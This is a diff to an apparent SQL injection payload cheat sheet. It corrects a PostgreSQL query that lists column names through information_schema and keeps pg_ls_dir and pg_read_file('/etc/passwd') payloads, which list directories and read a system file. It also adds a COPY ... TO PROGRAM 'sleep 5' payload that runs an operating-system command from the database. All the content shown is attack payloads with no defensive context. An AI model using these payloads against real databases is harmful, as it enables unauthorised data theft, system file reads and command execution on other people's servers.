@@ -62,7 +62,7 @@ SELECT GROUP_CONCAT(column_name,',') FROM information_schema.columns WHERE table
 
 ```
 SELECT string_agg(table_name,',') FROM information_schema.tables;
-SELECT string_agg(table_name,',') FROM information_schema.columns WHERE table_name = 'users';
+SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name = 'users';
 ```
 
 ### SQLite
@@ -86,8 +86,9 @@ SELECT GROUP_CONCAT(name,',') FROM PRAGMA_TABLE_INFO('users');
 ### PostgreSQL
 
 ```
-select pg_ls_dir('.');
-select pg_read_file('/etc/passwd');
+SELECT pg_ls_dir('.');
+SELECT pg_read_file('/etc/passwd');
+COPY (SELECT '') TO PROGRAM 'sleep 5';
 ```
 
 ### MySQL
